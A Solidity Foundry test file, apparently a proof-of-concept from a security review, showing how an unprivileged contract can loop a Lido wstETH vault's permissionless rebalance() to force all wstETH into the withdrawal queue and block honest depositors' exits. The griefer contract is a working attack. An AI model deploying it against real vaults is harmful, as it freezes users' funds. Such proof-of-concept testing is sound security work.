// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {TestBase_LidoWstETHStandardExchange} from "contracts/test/bases/TestBase_LidoWstETHStandardExchange.sol";
import {ILidoWstETHRebalance} from "contracts/protocols/staking/lido/interfaces/ILidoWstETHStandardVault.sol";

/// Unprivileged griefer: loops the permissionless rebalance() until the vault holds no wstETH.
contract RequeueGriefer {
    function run(ILidoWstETHRebalance v, IERC20 wst, uint256 maxCalls) external returns (uint256 calls) {
        while (wst.balanceOf(address(v)) > 0 && calls < maxCalls) {
            v.rebalance();
            ++calls;
        }
    }
}

contract StakingRequeue_Test is TestBase_LidoWstETHStandardExchange {
    address lp = makeAddr("honestLP");
    address smallLp = makeAddr("smallLP");
    address attackerEoa = makeAddr("attacker");

    function _depositWeth(address who, uint256 amt) internal returns (uint256 shares) {
        _dealWeth(who, amt);
        vm.startPrank(who);
        hermeticWeth.approve(seVault, amt);shares = seIn.exchangeIn(IERC20(address(hermeticWeth)), amt, IERC20(seVault), 0, who, false, block.timestamp + 1);
        vm.stopPrank();
    }

    function _setup() internal {
        // Honest LPs deposit; anyone rebalances once -> vault stakes down to the 5% liquid target.
        _depositWeth(lp, 190 ether);
        _depositWeth(smallLp, 10 ether);
        seRebalance.rebalance();
        console2.log("after initial rebalance: liquid WETH", lidoSe.liquidReserveEth());
        console2.log("after initial rebalance: wstETH held", hermeticWstEth.balanceOf(seVault));
        // Honest small exit of 3 WETH from the liquid sleeve -> creates a ~3 ETH deficit (> 10% band).
        vm.startPrank(smallLp);
        seOut.exchangeOut(IERC20(seVault), type(uint256).max, IERC20(address(hermeticWeth)), 3 ether, smallLp, false, block.timestamp + 1);
        vm.stopPrank();
        console2.log("after honest 3 WETH exit: liquid", lidoSe.liquidReserveEth());
        console2.log("total reserve", lidoSe.totalReserveEth());
    }

    function _lockedExit(address who, uint256 wstOut) internal returns (bool ok) {
        vm.startPrank(who);
        try seOut.exchangeOut(IERC20(seVault), type(uint256).max, IERC20(address(hermeticWstEth)), wstOut, who, false, block.timestamp + 1) {
            ok = true;
        } catch (bytes memory err) {
            console2.log("locked exit reverted, selector:");
            console2.logBytes(err);
        }
        vm.stopPrank();
    }

    function test_requeue_forcesWholeInventoryIntoQueue_DoS() public {
        _setup();
        uint256 wstBefore = hermeticWstEth.balanceOf(seVault);
        uint256 totalBefore = lidoSe.totalReserveEth();
        uint256 liquidBefore = lidoSe.liquidReserveEth();
        uint256 snap = vm.snapshotState();

        // CONTROL: one honest rebalance queues only the actual deficit.
        seRebalance.rebalance();
        uint256 wstAfterOne = hermeticWstEth.balanceOf(seVault);
        console2.log("control: wstETH queued by one rebalance", wstBefore - wstAfterOne);
        assertTrue(_lockedExit(lp, 50 ether), "control: 50 wstETH locked exit should succeed");
        vm.revertToState(snap);

        // ATTACK: unprivileged contract loops rebalance() in one tx.
        vm.startPrank(attackerEoa);
        RequeueGriefer g = new RequeueGriefer();
        uint256 g0 = gasleft();
        uint256 calls = g.run(seRebalance, IERC20(address(hermeticWstEth)), 500);
        uint256 gasUsed = g0 - gasleft();
        vm.stopPrank();

        uint256 queued = hermeticQueue.lastRequestId();
        console2.log("attacker rebalance calls", calls);
        console2.log("withdrawal requests outstanding", queued);
        console2.log("attack gas used", gasUsed);
        console2.log("wstETH left in vault", hermeticWstEth.balanceOf(seVault));
        console2.log("liquid WETH (unchanged)", lidoSe.liquidReserveEth());
        console2.log("deficit actually needed (ETH)", (totalBefore * DEFAULT_LIQUID_PCT / 1e18) - liquidBefore);
        console2.log("ETH value forced into queue", wstBefore);

        assertEq(hermeticWstEth.balanceOf(seVault), 0, "all wstETH forced into queue");
        assertEq(lidoSe.liquidReserveEth(), liquidBefore, "liquid not replenished");
        assertEq(lidoSe.totalReserveEth(), totalBefore, "NAV unchanged (no profit, pure grief)");
        assertGt(calls, 10);

        // Honest LP locked-side exit that succeeded in control now reverts.
        assertFalse(_lockedExit(lp, 50 ether), "locked exit must now revert");
        // Even 1 wei of wstETH can't be withdrawn.
        assertFalse(_lockedExit(lp, 1 ether), "any locked exit reverts");

        // Gas of a view NAV call with many pending requests (bounded).
        uint256 g1 = gasleft();
        lidoSe.totalReserveEth();
        console2.log("totalReserveEth gas w/ pending", g1 - gasleft());
    }
}
